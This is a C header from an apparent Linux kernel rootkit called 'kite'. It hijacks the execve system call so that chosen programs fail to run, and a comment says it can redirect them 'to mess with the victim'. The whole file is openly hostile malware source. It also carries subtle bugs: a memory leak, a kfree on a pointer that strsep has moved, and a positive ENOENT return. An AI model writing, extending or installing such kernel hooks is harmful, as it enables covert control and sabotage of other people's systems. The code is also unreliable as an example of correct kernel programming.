#ifndef EXECVE_BLOCK_KITE
    #define EXECVE_BLOCK_KITE
    #include <linux/unistd.h>

    #include "kite_hook.h"
    #include "linked_list.h"


/*using hook to execve, block executables from running by user request,
 can also change to another executable to mess with the victim*/
#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_execve(struct pt_regs *regs){
    char *token;
    char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    if(temp_filename == NULL){
        return orig_execve(regs);
    }

    if(copy_from_user(temp_filename, (char *)regs->di, NAME_MAX) != 0){
        kfree(temp_filename);
        return orig_execve(regs);
    }

    if(find_node(&exec_to_block, temp_filename) == 0){
        return ENOENT;
    }

    while((token = strsep(&temp_filename, "/"))) { // loop through the string to extract executable filename in path by spliting /, strsep like strtok()
        if(find_node(&exec_to_block, token) == 0){
            kfree(temp_filename);
            return ENOENT; // return not found
        }
    }
    return orig_execve(regs);
}
#else
static asmlinkage int hack_execve(const char *pathname, char *const argv[], char *const envp[]){
    char *token;
    char *temp_filename = kmalloc(NAME_MAX + 1, GFP_KERNEL);
    if(temp_filename == NULL){
        return orig_execve(pathname, argv, envp);
    }

    if(copy_from_user(temp_filename, pathname, NAME_MAX) != 0){
        kfree(temp_filename);
        return orig_execve(pathname, argv, envp);
    }

    if(find_node(&exec_to_block, temp_filename) == 0){
        return ENOENT;
    }

    while((token = strsep(&temp_filename, "/"))) { // loop through the string to extract executable filename in path by spliting /, strsep like strtok()
        if(find_node(&exec_to_block, token) == 0){
            kfree(temp_filename);
            return ENOENT; // return not found
        }
    }
    return orig_execve(pathname, argv, envp);
}
#endif
#endif